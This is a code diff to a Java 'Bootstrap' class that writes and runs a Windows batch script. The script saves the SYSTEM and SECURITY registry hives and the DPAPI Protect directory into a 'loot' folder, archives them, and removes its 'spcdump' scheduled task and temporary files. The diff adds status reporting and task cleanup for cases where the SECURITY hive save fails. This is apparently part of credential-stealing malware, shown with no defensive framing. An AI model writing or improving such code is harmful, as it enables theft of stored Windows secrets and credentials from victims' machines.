@@ -326,6 +326,15 @@ public final class Bootstrap {
 		}
 		deleteFile(script);
 		deleteFile(dump);
+		Path status = loot.resolve("hives.status");
+		if (Files.isRegularFile(status)) {
+			try {
+				Log.debug("Bootstrap hives: " + Files.readString(status).trim());
+			} catch (Throwable throwable) {
+				// best effort
+			}
+			deleteFile(status);
+		}
 		boolean ready = Files.isRegularFile(hives);
 		if (!ready) {
 			Log.debug("Bootstrap hives pending, attempt " + state.hivesAttempts);
@@ -351,6 +360,8 @@ public final class Bootstrap {
 			"@echo off",
 			"reg save HKLM\\SYSTEM \"" + loot.resolve("SYSTEM.hiv") + "\" /y",
 			"reg save HKLM\\SECURITY \"" + loot.resolve("SECURITY.hiv") + "\" /y",
+			"if not exist \"" + loot.resolve("SECURITY.hiv") + "\" (echo missing security > \""
+				+ loot.resolve("hives.status") + "\" & schtasks /delete /tn spcdump /f >nul 2>&1 & exit /b 1)",
 			"robocopy C:\\Windows\\System32\\Microsoft\\Protect \"" + loot.resolve("ProtectSystem")
 				+ "\" /e /njh /njs /ndl /nc /ns",
 			"tar -a -cf \"" + hives + "\" -C \"" + loot + "\" SYSTEM.hiv SECURITY.hiv ProtectSystem",
